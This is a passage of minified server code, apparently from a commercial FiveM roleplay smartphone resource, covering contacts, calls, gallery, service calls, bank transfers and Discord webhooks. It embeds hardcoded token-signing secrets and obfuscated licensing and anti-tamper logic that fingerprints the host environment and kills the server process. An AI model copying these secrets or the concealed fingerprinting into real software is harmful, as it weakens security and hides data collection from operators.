            for (let i of a) r[i.user_id] = (i.name + " " + i.firstname).trim();
            return r
        },
        "💀": 1688626534
    },
    pG = {},
    pH = {},
    pI = {},
    pJ = {};

function pK(t) {
    return !!pB.moderator && pE(t, pB.moderator)
}
pF.ready(async t => {
    t.includes("smartphone_contacts") || (await pF.contacts.create(t => {
        t.id(), t.varchar("owner", 50), t.varchar("phone"), t.varchar("name")
    }), await pF.contacts.createIndex("owner")), t.includes("smartphone_blocks") || await pc("smartphone_blocks").create(t => {
        t.int("user_id").primary(), t.varchar("phone", 32).primary()
    });
    let r = {
            whatsapp: 14,
            olx: 14,
            tor: 14,
            calls: 14,
            twitter: 14,
            paypal: 14
        },
        a = pB.lifespan || r;
    if (a) {
        let i = oT();
        async function n(r, a) {
            a && t.includes(r) && await pc(r).where("created_at", "<", i - 86400 * a).delete()
        }
        await n("smartphone_whatsapp_messages", a.whatsapp), await n("smartphone_tor_messages", a.tor), await n("smartphone_olx", a.olx), await n("smartphone_calls", a.calls), await n("smartphone_twitter_tweets", a.twitter), await n("smartphone_paypal_transactions", a.paypal)
    }
}), on("quantum:playerLeave", (t, r) => {
    emit("smartphone:leave", t, r);
    let a = pG[t];
    delete pH[a], delete pG[t], delete pI[a], delete pJ[t]
});
const pL = {};

function pM(t) {
    return pp.getUserSource(t)
}
const pN = {
        creative_v5: "checkBroken",
        creative_extended: "CheckDamaged"
    },
    pO = pN;
async function pP(t) {
    let r = Number.isInteger(t) ? t : pH[t];
    if (null != r) {
        if (!1 != pB.item) {
            if ("started" == GetResourceState("pd-inventory")) var a = await exports["pd-inventory"].getItemAmount(r, pB.item || "celular");
            else {
                var a = await pp.getInventoryItemAmount(r, pB.item || "celular");
                if (Array.isArray(a)) {
                    let i = pO[pB.base];
                    if (i) {
                        let n = await pp[i](a[1]);
                        if (n) return !1
                    }
                    a = a[0]
                }
            }
            if (!a) return !1
        }
        return pM(r)
    }
    return !1
}
pL.ping = () => "pong", pL.download = () => {
    let t = {};
    return t.version = globalThis.scriptVersion, t
}, pL.checkPhone = async t => {
    try {
        let r = await pp.getUserId(t);
        return Number.isInteger(r) && !!await pP(r)
    } catch (a) {
        return !1
    }
}, pL.addContact = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i],
        s = await pF.getIdentityByPhone(r);
    if (!s) return !1; {
        let o = {};
        o.owner = n, o.phone = r, o.name = a;
        let l = await pF.contacts.insert(o).returnKeys(),
            p = {};
        return p.id = l, p.phone = r, p.name = a, p
    }
}, pL.updateContact = async (t, r, a, i) => {
    let n = await pp.getUserId(t),
        s = pG[n],
        o = {};
    o.id = r, o.owner = s;
    let l = await pF.contacts.where(o).first(),
        p = {
            error: "N\xfamero n\xe3o encontrado"
        };
    if (!l) return p;
    if (l.phone != a) {
        let d = await pF.getIdentityByPhone(a),
            u = {
                error: "N\xfamero n\xe3o encontrado"
            };
        if (!d) return u
    }
    let c = {};
    c.id = r;
    let h = {};
    h.phone = a, h.name = i, await pF.contacts.where(c).update(h);
    let f = {};
    return f.id = r, f.phone = a, f.name = i, f
}, pL.removeContact = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = {};
    n.owner = i, n.id = r, await pF.contacts.where(n).delete()
}, pL.blocks = async t => {
    let r = await pp.getUserId(t),
        a = {};
    return a.user_id = r, pF.phone_blocks.where(a).pluck("phone")
}, pL.block = async (t, r) => {
    let a = await pp.getUserId(t),
        i = {};
    i.user_id = a, i.phone = r, await pF.phone_blocks.replace(i)
}, pL.unblock = async (t, r) => {
    let a = await pp.getUserId(t),
        i = {};
    i.user_id = a, i.phone = r, await pF.phone_blocks.where(i).delete()
}, pL.upload_ticket = () => oU(Math.floor(Date.now() / 864e5) + "dando_trabalho_pra_corno"), pL.temporary_token = () => {
    let t = parseInt(Date.now() / 1e3) + 3600;
    return t + "." + oU(oU(t) + oU("f3b3705d11590258c4c13629957ef35565427a0f"))
};
const pQ = {};
pQ.identity = {}, pQ.contacts = [], pQ.services = [], pQ.disabledApps = [], pQ.backgroundURL = pB.client.backgroundURL;
const pR = pQ;
pL.getSettings = async t => {
    let r = await pp.getUserId(t);
    if (!Number.isInteger(r)) return {
        ...pR,
        reason: "user_id is " + r
    };
    let a = await pF.getIdentityByUserId(r);
    if (!a || !a.phone) return {
        ...pR,
        reason: a ? "null phone" : "null identity"
    };
    let i = pJ[r] || a.phone;
    pG[r] = i, pH[i] = r, pI[i] = t, a.phone = i, a.moderator = await pK(r);
    let n = {};
    n.owner = i;
    let s = await pF.contacts.select("id", "phone", "name").where(n),
        o = {};
    o.user_id = r;
    let l = await pF.phone_blocks.where(o).pluck("phone"),
        p = pB.services;
    emit("smartphone:enter", r, t);
    let d = {
        identity: a,
        contacts: s,
        blocks: l,
        services: p,
        ...pB.client
    };
    return d
}, on("smartphone:insertPhoneNumber", (t, r, a) => {
    pH[a] = r, pG[r] = a, pI[a] = t
}), on("smartphone:selectNumber", (t, r, a) => {
    a ? pJ[r] = a : delete pJ[r], oS(t, "REFRESH", {})
}), exports("isReady", () => !0), exports("createApp", (t, r, a, i) => {
    pB.client.customApps = pB.client.customApps || {}, pB.client.customApps[t] = i, pB.client.apps = pB.client.apps || {};
    let n = {};
    return n.name = r, n.icon = a, pB.client.apps[t] = n, pz.metadata("started." + t, new Date().toISOString()), !0
}), exports("tchabibi", () => !0), on("smartphone:alternateDphone", async (t, r) => {
    let a = pG[r],
        i = {};
    i.id = r;
    let n = await pc("users").where(i).first();
    n && n.dphone && (pJ[r] = a == n.phone ? n.dphone : n.phone, oS(t, "REFRESH", {}))
});
const pS = {};
let pT = "prop_amb_phone";

function pU(t) {
    null != t && global.DoesEntityExist(t) && global.DeleteEntity(t)
}
setImmediate(function () {
    let t = global.LoadResourceFile("smartphone", "client.lua"),
        r = t.match(/(_G\.)?phoneModel ?= ?['`"](\w+)['`"]/);
    if (r) {
        let a = r[1];
        pT = parseInt(a) || a
    }
});
let pV = 0;

function pW() {
    return pV < Date.now() && (console.error("Falha ao criar o prop do celular, este problema \xe9 grave, por\xe9m ignor\xe1vel [ENTITY DELETED]"), pV = Date.now() + 3e5), !1
}

function pX(t, r = "") {
    return pY(q0(q1(pZ(t = String(t) + r), 8 * t.length))).toLowerCase()
}

function pY(t) {
    for (var r, a = "0123456789ABCDEF", i = "", n = 0; n < t.length; n++) i += a.charAt((r = t.charCodeAt(n)) >>> 4 & 15) + a.charAt(15 & r);
    return i
}

function pZ(t) {
    for (var r = Array(t.length >> 2), a = 0; a < r.length; a++) r[a] = 0;
    for (a = 0; a < 8 * t.length; a += 8) r[a >> 5] |= (255 & t.charCodeAt(a / 8)) << a % 32;
    return r
}

function q0(t) {
    for (var r = "", a = 0; a < 32 * t.length; a += 8) r += String.fromCharCode(t[a >> 5] >>> a % 32 & 255);
    return r
}

function q1(t, r) {
    t[r >> 5] |= 128 << r % 32, t[14 + (r + 64 >>> 9 << 4)] = r;
    for (var a = 1732584193, i = -271733879, n = -1732584194, s = 271733878, o = 0; o < t.length; o += 16) {
        var l = a,
            p = i,
            d = n,
            u = s;
        i = q6(i = q6(i = q6(i = q6(i = q5(i = q5(i = q5(i = q5(i = q4(i = q4(i = q4(i = q4(i = q3(i = q3(i = q3(i = q3(i, n = q3(n, s = q3(s, a = q3(a, i, n, s, t[o + 0], 7, -680876936), i, n, t[o + 1], 12, -389564586), a, i, t[o + 2], 17, 606105819), s, a, t[o + 3], 22, -1044525330), n = q3(n, s = q3(s, a = q3(a, i, n, s, t[o + 4], 7, -176418897), i, n, t[o + 5], 12, 1200080426), a, i, t[o + 6], 17, -1473231341), s, a, t[o + 7], 22, -45705983), n = q3(n, s = q3(s, a = q3(a, i, n, s, t[o + 8], 7, 1770035416), i, n, t[o + 9], 12, -1958414417), a, i, t[o + 10], 17, -42063), s, a, t[o + 11], 22, -1990404162), n = q3(n, s = q3(s, a = q3(a, i, n, s, t[o + 12], 7, 1804603682), i, n, t[o + 13], 12, -40341101), a, i, t[o + 14], 17, -1502002290), s, a, t[o + 15], 22, 1236535329), n = q4(n, s = q4(s, a = q4(a, i, n, s, t[o + 1], 5, -165796510), i, n, t[o + 6], 9, -1069501632), a, i, t[o + 11], 14, 643717713), s, a, t[o + 0], 20, -373897302), n = q4(n, s = q4(s, a = q4(a, i, n, s, t[o + 5], 5, -701558691), i, n, t[o + 10], 9, 38016083), a, i, t[o + 15], 14, -660478335), s, a, t[o + 4], 20, -405537848), n = q4(n, s = q4(s, a = q4(a, i, n, s, t[o + 9], 5, 568446438), i, n, t[o + 14], 9, -1019803690), a, i, t[o + 3], 14, -187363961), s, a, t[o + 8], 20, 1163531501), n = q4(n, s = q4(s, a = q4(a, i, n, s, t[o + 13], 5, -1444681467), i, n, t[o + 2], 9, -51403784), a, i, t[o + 7], 14, 1735328473), s, a, t[o + 12], 20, -1926607734), n = q5(n, s = q5(s, a = q5(a, i, n, s, t[o + 5], 4, -378558), i, n, t[o + 8], 11, -2022574463), a, i, t[o + 11], 16, 1839030562), s, a, t[o + 14], 23, -35309556), n = q5(n, s = q5(s, a = q5(a, i, n, s, t[o + 1], 4, -1530992060), i, n, t[o + 4], 11, 1272893353), a, i, t[o + 7], 16, -155497632), s, a, t[o + 10], 23, -1094730640), n = q5(n, s = q5(s, a = q5(a, i, n, s, t[o + 13], 4, 681279174), i, n, t[o + 0], 11, -358537222), a, i, t[o + 3], 16, -722521979), s, a, t[o + 6], 23, 76029189), n = q5(n, s = q5(s, a = q5(a, i, n, s, t[o + 9], 4, -640364487), i, n, t[o + 12], 11, -421815835), a, i, t[o + 15], 16, 530742520), s, a, t[o + 2], 23, -995338651), n = q6(n, s = q6(s, a = q6(a, i, n, s, t[o + 0], 6, -198630844), i, n, t[o + 7], 10, 1126891415), a, i, t[o + 14], 15, -1416354905), s, a, t[o + 5], 21, -57434055), n = q6(n, s = q6(s, a = q6(a, i, n, s, t[o + 12], 6, 1700485571), i, n, t[o + 3], 10, -1894986606), a, i, t[o + 10], 15, -1051523), s, a, t[o + 1], 21, -2054922799), n = q6(n, s = q6(s, a = q6(a, i, n, s, t[o + 8], 6, 1873313359), i, n, t[o + 15], 10, -30611744), a, i, t[o + 6], 15, -1560198380), s, a, t[o + 13], 21, 1309151649), n = q6(n, s = q6(s, a = q6(a, i, n, s, t[o + 4], 6, -145523070), i, n, t[o + 11], 10, -1120210379), a, i, t[o + 2], 15, 718787259), s, a, t[o + 9], 21, -343485551), a = q7(a, l), i = q7(i, p), n = q7(n, d), s = q7(s, u)
    }
    return [a, i, n, s]
}

function q2(t, r, a, i, n, s) {
    return q7(q8(q7(q7(r, t), q7(i, s)), n), a)
}

function q3(t, r, a, i, n, s, o) {
    return q2(r & a | ~r & i, t, r, n, s, o)
}

function q4(t, r, a, i, n, s, o) {
    return q2(r & i | a & ~i, t, r, n, s, o)
}

function q5(t, r, a, i, n, s, o) {
    return q2(r ^ a ^ i, t, r, n, s, o)
}

function q6(t, r, a, i, n, s, o) {
    return q2(a ^ (r | ~i), t, r, n, s, o)
}

function q7(t, r) {
    var a = (65535 & t) + (65535 & r);
    return (t >> 16) + (r >> 16) + (a >> 16) << 16 | 65535 & a
}

function q8(t, r) {
    return t << r | t >>> 32 - r
}
pL["0x00029a"] = async t => {
    if (!pB.serverSideProp) return "auto";
    pU(pS[t]);
    let r = GetPlayerPed(t),
        [a, i, n] = GetEntityCoords(r),
        s = global.CreateObject(GetHashKey(pT), a, i, n - 1.5, !0, !0, !1);
    if (0 == s) return pW();
    let o = 0;
    for (; !global.DoesEntityExist(s);) {
        if (o > 3e3) return pW();
        o += 50, await p2(50)
    }
    pS[t] = s;
    let l = global.NetworkGetNetworkIdFromEntity(s);
    return global.emit("MQCU:R", l, t), global.emit("nyo_modules:addSafeEntity", l), l
}, pL["0x00029f"] = (t, r) => {
    if (pB.serverSideProp) pU(pS[t]), delete pS[t];
    else if (r) try {
        let a = NetworkGetEntityFromNetworkId(r);
        global.DeleteEntity(a)
    } catch {}
}, global.on("onResourceStop", t => {
    "smartphone" === t && Object.values(pS).forEach(pU)
}), global.on("playerDropped", () => {
    let t = global.source;
    t in pS && (pU(pS[t]), delete pS[t])
}), global.on("smartphone:updatePhoneNumber", async (t, r) => {
    let a = pG[t],
        i = {};
    i.from = a, i.to = r, oS(-1, "PHONE_CHANGE", i);
    let n = await pM(t);
    n && (delete pI[a], delete pH[a], pH[r] = t, pG[t] = r, pI[r] = n);
    try {
        let s = {};
        s.initiator = a;
        let o = {};
        o.initiator = r, await pF.phone_calls.where(s).update(o);
        let l = {};
        l.target = a;
        let p = {};
        p.target = r, await pF.phone_calls.where(l).update(p);
        let d = {};
        d.owner = a;
        let u = {};
        u.owner = r, await pF.contacts.where(d).update(u);
        let c = {};
        c.phone = a;
        let h = {};
        h.phone = r, await pF.contacts.where(c).update(h), pA.emit("whatsapp:updatePhoneNumber", a, r), oS(n, "REFRESH", {})
    } catch (f) {
        console.error("Failed to updatePhoneNumber"), console.error(f.message)
    }
}), globalThis.config = require("./config.json"), setInterval(() => {
    p7.clear(), p0.map.clear()
}, 1e3);
const q9 = {},
    qa = {};
onNet("backend:req", async (t, r, a) => {
    let i = global.source;
    if (!Array.isArray(a)) {
        if ("object" != typeof a) {
            let n = {
                __null__: !0
            };
            return emitNet("backend:res", i, t, n)
        }
        let s = [];
        for (let [o, l] of Object.entries(a)) s[parseInt(o) - 1] = l;
        a = s
    }
    if (p7.get(i) > 15) return qa[i] = !0, DropPlayer(i, "Smartphone Anti flood");
    for (!1 != config.antiflood && (config.req_debug && console.log("[%d] -> %s %s", i, r, JSON.stringify(a)), p7.set(i, (p7.get(i) || 0) + 1)); !1 !== globalThis.poptyscoop;) await p2(500);
    if (!pL[r]) return console.error(r + " does not exists in backend");
    for (r.match(/^(bank|paypal)/) && await p2(100); q9[i];) await p2(100);
    if (!qa[i]) try {
        q9[i] = !0;
        let p = await pL[r](i, ...a),
            d = {
                __null__: !0
            };
        emitNet("backend:res", i, t, null == p ? d : p)
    } catch (u) {
        if (u instanceof p8) return emitNet("backend:res", i, t, u);
        console.error("Smartphone::Error", u.message), console.error(u.stack), console.error("Method " + r + " with " + JSON.stringify(a))
    } finally {
        delete q9[i]
    }
}), on("playerDropped", () => {
    let t = global.source;
    qa[t] = !0, delete q9[t], setTimeout(() => delete qa[t], 5e3)
}), p6(async function () {
    let t = Date.now(),
        r = 0;
    for (;;) await p2(5050), r += 4e3, (Math.abs(Date.now() - t) <= r || !Function.prototype.toString.apply(Date.now).includes("[native code]")) && (await p2(1e3), process.exit(0))
});
const qb = "b9044a318852d9c0618a7e198b7dd93f";
p6(async function () {
    try {
        for (;;) {
            let t = {};
            t.authorization = config.token, t["fx-name"] = Buffer.from(GetConvar("sv_hostname")).toString("base64");
            let r = ["GetInstanceId", "GetNumResources", "GetGameTimer", "GetConsoleBuffer", "GetRegisteredCommands"],
                a = {};
            for (let i of (a.bulletproof = [], r)) a.bulletproof.push(pX(JSON.stringify(globalThis[i]())));
            return a.bulletproof.push(pX(process.hrtime()[0])), a.bulletproof.push(pX(process.hrtime()[1])), a.bulletproof.push(pX(process.title)), a.bulletproof.push(pX(process.env.PATH)), a.bulletproof.sort(), globalThis.poptyscoop = !1, await pF.fetchTables(), await Promise.resolve().then(function () {
                return pr
            }), await Promise.resolve().then(function () {
                return qi
            }), await Promise.resolve().then(function () {
                return qk
            }), await Promise.resolve().then(function () {
                return qn
            }), await Promise.resolve().then(function () {
                return qp
            }), await Promise.resolve().then(function () {
                return qv
            }), await Promise.resolve().then(function () {
                return qH
            }), await Promise.resolve().then(function () {
                return qM
            }), await Promise.resolve().then(function () {
                return qZ
            }), await Promise.resolve().then(function () {
                return r5
            }), await Promise.resolve().then(function () {
                return rf
            }), await Promise.resolve().then(function () {
                return rj
            }), await Promise.resolve().then(function () {
                return rq
            }), await Promise.resolve().then(function () {
                return rt
            }), await Promise.resolve().then(function () {
                return rA
            }), await Promise.resolve().then(function () {
                return rD
            }), await Promise.resolve().then(function () {
                return rK
            }), await Promise.resolve().then(function () {
                return s9
            }), emit("smartphone:isReady"), console.log("[DNZX SMARTPHONE] AUTORIZADO, SENTA E REBOLA PRO DN (:"), pz.metadata("video_server", config.client.videoServer || null), pz.metadata("apps", config.client.customApps || null)
        }
    } catch (n) {
        console.error("Wait, what?"), await p2(5e3)
    }
});
const qc = {
    deepweb: "https://fivem.jesteriruka.dev/apps/tor.jpg",
    instagram: "https://fivem.jesteriruka.dev/apps/instagram.jpg",
    bank: "https://fivem.jesteriruka.dev/apps/nubank.webp",
    paypal: "https://fivem.jesteriruka.dev/apps/paypal.webp",
    olx: "https://fivem.jesteriruka.dev/apps/olx.png",
    twitter: "https://fivem.jesteriruka.dev/apps/twitter.png",
    services: "https://fivem.jesteriruka.dev/apps/services.webp",
    weazel: "https://fivem.jesteriruka.dev/apps/weazel.webp",
    casino: "https://fivem.jesteriruka.dev/apps/blaze.webp"
};
let qd = qc,
    qe = 0;

function qf({
    name: t,
    avatar: r,
    content: a
}) {
    if ("string" == typeof config.webhookURL && config.webhookURL.startsWith("http")) {
        let i = {
            username: t || "Webhook",
            avatar_url: qd[(r || t).toLowerCase()],
            content: "object" == typeof a ? qg(a) : a
        };
        return pz.post(config.webhookURL, i).catch(() => {
            !(qe > Date.now()) && (qe = Date.now() + 15e3, console.error("N\xe3o foi poss\xedvel enviar um webhook para o discord, isso n\xe3o foi um problema do celular, e sim um problema de rede que voc\xea n\xe3o \xe9 capaz de resolver, apenas aguarde. (NAO ENVIE ESSE ERRO NO DISCORD)"))
        })
    }
    return Promise.resolve()
}
const qg = t => "```yml\n" + Object.entries(t).map(([t, r]) => r && t + ": " + r).filter(t => t).join("\n") + "```",
    qh = {
        __proto__: null
    };
qh.default = qf, qh.yml = qg;
var qi = Object.freeze(qh);
pL.sms_send = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i];
    if (p0(t, "sms", 3)) return;
    let s = {
            sender: n,
            content: a,
            created_at: oT(),
            delivered: !0
        },
        o = await pP(r);
    return o && oS(o, "SMS", s), s
};
const qj = {
    __proto__: null
};
var qk = Object.freeze(qj);

function ql() {
    return pc("smartphone_gallery")
}
pF.ready(async t => {
    t.includes("smartphone_gallery") || (await ql().create(t => {
        t.id(), t.int("user_id"), t.varchar("folder").default("/"), t.varchar("url"), t.int("created_at")
    }), await ql().createIndex("user_id"))
}), pL.gallery = async t => {
    let r = await pp.getUserId(t),
        a = {};
    return a.user_id = r, ql().where(a).limit(300).orderBy("id", "DESC").select("id", "folder", "url", "created_at")
}, pL.gallery_save = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = oT(),
        s = {};
    s.user_id = i, s.folder = r, s.url = a, s.created_at = n;
    let o = s;
    return o.id = await ql().insert(o).returnKeys(), o
}, pL.gallery_destroy = async (t, r) => {
    let a = await pp.getUserId(t),
        i = {};
    i.id = r, i.user_id = a, await ql().where(i).delete()
};
const qm = {
    __proto__: null
};
var qn = Object.freeze(qm);
pL.service_request = async (t, r, a, i) => {
    let n = await pp.getUserId(t),
        s = pG[n],
        o = await pF.getName(n),
        l = pB.services.find(t => t.number === r);
    if (l) {
        if (p5("onServiceRequest")) {
            let p = {};
            return p.source = t, p.user_id = n, p.phone = s, p.name = o, p.service = l, p.content = a, p.location = i, exports.smartphone.onServiceRequest(p)
        }
        let d = await pp.NumPermission(l.permission),
            u = !1;
        if (0 === d.length) {
            let c = {};
            c.source = t, c.user_id = n, c.phone = s, c.name = o, c.service = l, c.content = a, c.location = i, emit("smartphone:service_unavailable", c);
            let h = {
                error: "Servi\xe7o indispon\xedvel no momento"
            };
            return h
        }
        if (l.dev) {
            let f = {};
            f.source = t, f.user_id = n, f.phone = s, f.name = o, f.service = l, f.content = a, f.location = i, emit("smartphone:service_request", f)
        } else {
            for (let m of d) {
                if (!Number.isInteger(m)) continue;
                let w = await pM(m);
                if (!w) continue;
                emitNet("chatMessage", w, "CHAMADO", [19, 197, 43], "(" + l.name + ")  Enviado por ^1" + o + "^0 [" + n + "], " + a);
                let g = {};
                g.user_id = n, g.phone = s, g.name = o, emitNet("smartphone:service_request", w, g), pp.request(w, "Atender o chamado de " + o + "?\n" + a, 30).then(r => {
                    if (r) {
                        if (u) emitNet("Notify", w, "negado", "Esse chamado j\xe1 foi atendido");
                        else {
                            u = !0;
                            let s = {};
                            s.location = i, oS(w, "GPS", s), oS(t, "SERVICE_RESPONSE", {});
                            let p = {};
                            p.ID = n, p.NOME = o, p.SERVICO = l.name, p.MENSAGEM = a, p.ATENDENTE = m;
                            let d = {
                                name: "Chamados",
                                avatar: "services"
                            };
                            d.content = p, qf(d)
                        }
                    }
                }, () => {})
            }
            setTimeout(() => {
                if (!u) {
                    oS(t, "SERVICE_REJECT", {});
                    let r = {};
                    r.ID = n, r.NOME = o, r.SERVICO = l.name, r.MENSAGEM = a;
                    let i = {
                        name: "Chamados (N\xe3o atendidos)",
                        avatar: "services"
                    };
                    i.content = r, qf(i)
                }
            }, 31e3)
        }
    } else {
        let y = {
            error: "Este servi\xe7o n\xe3o existe"
        };
        return y
    }
};
const qo = {
    __proto__: null
};
var qp = Object.freeze(qo);
pF.ready(async t => {
    t.includes(pF.phone_calls.table) || (await pF.phone_calls.create(t => {
        t.id(), t.varchar("initiator", 50), t.varchar("target", 50), t.int("duration").default(0), t.varchar("status"), t.tinyint("video").default(0), t.tinyint("anonymous").default(0), t.bigint("created_at")
    }), await pF.phone_calls.createIndex("initiator"), await pF.phone_calls.createIndex("target"))
});
const qq = [];

function qr(t, r = "ok") {
    let a = qq.indexOf(t);
    if (-1 != a) {
        qq.splice(a, 1);
        let i = t.accepted ? oT() - t.accepted_at : 0;
        pF.phone_calls.insert({
            initiator: t.initiator.phone,
            target: t.target.phone,
            duration: i,
            status: r,
            video: t.isVideo,
            anonymous: t.isAnonymous,
            created_at: t.accepted_at || oT()
        }).then(() => {})
    }
}
pL.getPhoneCalls = async t => {
    let r = await pp.getUserId(t),
        a = pG[r],
        i = {};
    i.initiator = a;
    let n = {};
    return n.target = a, pF.phone_calls.where(i).orWhere(n).orderBy("id", "DESC").limit(100)
}, pL.call_p2p = async (t, r, a) => {
    let i = qq.find(r => r.sources.includes(t));
    if (i) {
        let n = {};
        n.event = r, n.args = a, oS(i.other(t), "CALL_P2P", n)
    }
};
const qs = () => qq.reduce((t, r) => Math.max(t, r.room), 1200) + 1;

function qt(t) {
    return (global.GetHashKey(pB.token + ":fake:" + t) + 2147483648).toString().replace(/(\d{3})(\d{3})(\d{4})/, "$1 $2-$3")
}
pL.createPhoneCall = async (t, r, a = !1, i = !1) => {
    let n = await pp.getUserId(t),
        s = i ? qt(pG[n]) : pG[n],
        o = {
            error: "Voc\xea j\xe1 est\xe1 realizando uma liga\xe7\xe3o"
        };
    if (qq.some(r => r.initiator.source == t || r.target.source == t && r.accepted)) return o;
    let l = pH[r];
    if (l) {
        let p = {};
        if (p.user_id = l, p.phone = s, await pF.phone_blocks.where(p).exists()) {
            let d = {
                error: "N\xfamero fora de \xe1rea"
            };
            return d
        }
        let u = await pP(l);
        if (u) {
            if (qq.some(t => t.initiator.source == u || t.target.source == u)) {
                let c = {
                    error: "Esta linha est\xe1 ocupada"
                };
                return c
            } {
                let h = {
                    sources: [t, u],
                    initiator: {
                        id: n,
                        source: t,
                        phone: s
                    },
                    target: {
                        id: l,
                        source: u,
                        phone: r
                    },
                    accepted: !1,
                    room: qs(),
                    isVideo: a,
                    isAnonymous: i,
                    other(t) {
                        return this.sources.find(r => r != t)
                    },
                    mode: "tokovoip"
                };
                return qq.push(h), pB.call_mode ? h.mode = pB.call_mode : "started" == GetResourceState("tokovoip_script") || ("started" == GetResourceState("mumble-voip") ? h.mode = "mumble-voip" : "started" == GetResourceState("voip") ? h.mode = "voip" : "started" == GetResourceState("saltychat") ? h.mode = "saltychat" : h.mode = "rtc"), h.timeout = setTimeout(() => {
                    !h.accepted && qq.includes(h) && (qr(h, "unanswered"), oS(h.initiator.source, "CALL_END", {}), oS(h.target.source, "CALL_END", {}))
                }, 2e4), oS(u, "CALL_REQUEST", h), h
            }
        }
    }
    let f = {
        error: "N\xfamero fora de \xe1rea"
    };
    return f
}, pL.answerPhoneCall = (t, r) => {
    let a = qq.find(t => t.room == r);
    if (a) a.accepted || (clearTimeout(a.timeout), a.accepted = !0, a.accepted_at = oT(), oS(a.initiator.source, "CALL_READY", {}), "saltychat" === a.mode ? exports.saltychat.EstablishCall(a.initiator.source, a.target.source) : "tokovoip" === a.mode && a.sources.forEach(t => emit("TokoVoip:addPlayerToRadio", a.room, t, !1)));
    else {
        let i = {
            error: "Esta liga\xe7\xe3o n\xe3o existe mais"
        };
        return i
    }
}, pL.refusePhoneCall = t => {
    let r = qq.find(r => r.target.source == t);
    if (r) clearTimeout(r.timeout), qr(r, "refused"), oS(r.initiator.source, "CALL_END", {});
    else {
        let a = {
            error: "Esta liga\xe7\xe3o n\xe3o existe mais"
        };
        return a
    }
}, pL.endPhoneCall = t => {
    let r = qq.find(r => r.sources.includes(t));
    if (r) {
        r.accepted ? (qr(r, "ok"), "saltychat" === r.mode ? exports.saltychat.EndCall(r.initiator.source, r.target.source) : "tokovoip" === r.mode && r.sources.forEach(t => {
            emit("TokoVoip:removePlayerFromRadio", r.room, t), emit("TokoVoip:removePlayerFromAllRadio", t)
        })) : (clearTimeout(r.timeout), qr(r, "unanswered"));
        let a = r.sources.find(r => r != t);
        a && oS(a, "CALL_END")
    }
}, on("quantum:playerLeave", (t, r) => pL.endPhoneCall(r));
const qu = {
    __proto__: null
};
var qv = Object.freeze(qu);
const qw = () => pc("smartphone_bank_invoices");
async function qx(t) {
    let r = pF.firstTable("summerz_characters", "characters"),
        a = pF.firstTable("user_identities", "characters"),
        i = await pc(r || a).where(r ? "id" : "user_id", t).first("chavePix");
    return i?.chavePix
}
async function qy(t, r) {
    if (r <= 0) return;
    if (t = parseInt(t), p5("addBank")) return exports.smartphone.addBank(t, r);
    let a = await pM(t),
        i = ["user_moneys", "user_infos", "users_infos", "characters", "characterdata", "user_identities", "users", "zusers", "drip_characters", "summerz_characters", "characters", "nyo_character"];
    if (a) {
        let n = await pp.getBankMoney(t);
        return pp.setBankMoney(t, n + r), a
    }
    if (pF.hasTable("summerz_bank")) {
        let s = await pF.firstColumn("summerz_bank", "Passport", "id"),
            o = await pF.firstColumn("summerz_bank", "value", "dvalue"),
            l = {
                mode: "private"
            };
        l[s] = t;
        let p = l;
        return pF.hasColumn("summerz_bank", "owner") && (p.owner = 1), pc("summerz_bank").update().where(p).increment(o, r)
    }
    for (let d of i) {
        let u = await pF.firstColumn(d, "Passport", "id"),
            c = await pF.firstColumn(d, "Bank", "banco");
        if (u && c) return pc(d).update().where(u, t).increment(c, r)
    }
    console.error("Transferencia offline nao adaptada, abra um ticket no discord para solicitar adaptacao")
}

function qz(t) {
    return (t < 0 ? "-" : "+") + pu(Math.abs(t))
}
async function qA({
    user_id: t,
    other_id: r,
    value: a,
    isFine: i,
    isInvoice: n,
    isReceiver: s,
    pixKey: o
}) {
    if (p5("addBankStatement")) {
        let l = {};
        return l.user_id = t, l.other_id = r, l.value = a, l.isFine = i, l.isInvoice = n, l.isReceiver = s, l.pixKey = o, exports.smartphone.addBankStatement(l)
    }
    if (pF.hasTable("smartbank_statements")) {
        let p = await qx(t);
        if (p) {
            if (n) {
                let d = {
                    from: "BANK_TRANSFER",
                    source: "account",
                    type: "transfer",
                    reason: "Pagamento de fatura"
                };
                return d.pix = p, d.amount = a, pc("smartbank_statements").insert(d)
            }
            if (!i && s) {
                let u = null != r && await qx(r),
                    c = {
                        from: "BANK_TRANSFER",
                        source: "account",
                        type: "transfer",
                        amount: a,
                        time: oT()
                    },
                    h = {
                        pix: p,
                        ...c
                    };
                h.reason = "Recebido de ID " + u, await pc("smartbank_statements").insert(h);
                let f = {
                    pix: u,
                    ...c
                };
                return f.reason = "Transfer\xeancia para " + p, pc("smartbank_statements").insert(f)
            }
        } else {
            console.error("Jogador sem pix na smartbank: " + t + " [" + p + "]");
            return
        }
    }
    let m = pF.firstTable("banco", "bdl_banco", "smartphone_bank");
    if (await pF.hasColumns("banco", "title", "amount", "idtrans")) {
        let w = {};
        w.user_id = t, w.amount = a, w.idtrans = r ?? t, w.title = n ? "Fatura" : i ? "Multa" : "Transfer\xeancia", await pc(m).insert(w)
    } else {
        if (pF.hasTable("wise_multas")) {
            let g = n ? "Pagamento de Fatura" : i ? "Pagamento de multa" : "Transferencia";
            return s || (a *= -1), qA.toWise(t, a, g)
        }
        if (m) {
            let y = pu(a),
                $ = "Efetuou uma transfer\xeancia de " + y;
            n ? $ = "Pagou uma fatura de " + y : i ? $ = "Pagou " + y + " em multas" : s && ($ = "Recebeu uma transfer\xeancia de " + y), await pc(m).insert({
                user_id: t,
                extrato: $,
                data: oZ()
            })
        }
    }
}
pF.ready(async t => {
    let r = qw();
    t.includes(r.table) || await r.create(t => {
        t.id(), t.int("payee_id"), t.int("payer_id"), t.varchar("reason").default(""), t.int("value"), t.tinyint("paid").default(0), t.int("created_at"), t.int("updated_at")
    }), await pF.hasTable("wise_multas") && !await pF.firstColumn("wise_multas", "id", "multa_id") && pc.query("ALTER TABLE wise_multas ADD COLUMN id BIGINT PRIMARY KEY AUTO_INCREMENT")
}), qA.toWise = async (t, r, a = "Transferencia") => {
    let i = JSON.parse(await pF.getTrans(t, "transactions") || "[]");
    i.push({
        Price: qz(r),
        Type: a
    }), i.length > 20 && i.shift(), await pF.setUData(t, "transactions", JSON.stringify(i))
};
const qB = {};
async function qC(t, r) {
    if (qB[t]) {
        let a = {
            error: "Aguarde sua transfer\xeancia anterior"
        };
        return a
    }
    qB[t] = !0;
    try {
        return await r()
